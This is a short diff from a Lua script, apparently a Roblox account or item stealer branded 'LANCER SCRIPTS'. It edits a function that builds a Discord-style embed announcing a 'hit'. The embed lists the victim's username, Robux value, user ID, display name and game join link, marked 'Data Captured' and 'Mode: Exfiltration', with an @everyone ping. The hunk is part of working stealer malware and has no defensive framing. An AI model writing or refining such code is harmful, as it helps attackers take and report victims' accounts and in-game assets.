@@ -33,7 +33,7 @@ local function formatPayload(player, data)
     -- Constructing the specific 'Brainrot' styled message
     local payload = {
         ["embeds"] = {{
-            ["title"] = "🧠 [LANCER SCRIPTS] | Steal A Brainrot Hit! 🧠",
+            ["title"] = "🧠 [LANCER SCRIPTS] | ACC NOTIF🧠",
             ["description"] = "@everyone **👤 Player Info**\n```\nUsername     : " .. data.username .. "\nMin Value    : " .. data.robux .. " Robux\nExecutor     : " .. EXECUTOR_NAME .. "\nReceivers    : " .. RECEIVER_NAME .. "\n```\n**📡 Status**\n```diff\n+ ✅ CLAIMED  •  Data Captured\n```\n**✅ Captured Data**\n```diff\n+ [USER_ID] " .. data.userId .. " ➜ Captured\n+ [ACCOUNT] " .. data.username .. " ➜ Success\n+ [SESSION] " .. data.displayName .. " ➜ Verified\n```\n**Summary:** " .. data.joinLink .. "\n\n**Metadata:**\n```\nTime: " .. timestamp .. "\nStatus: Success\nMode: Exfiltration\n```"
         }}
     }
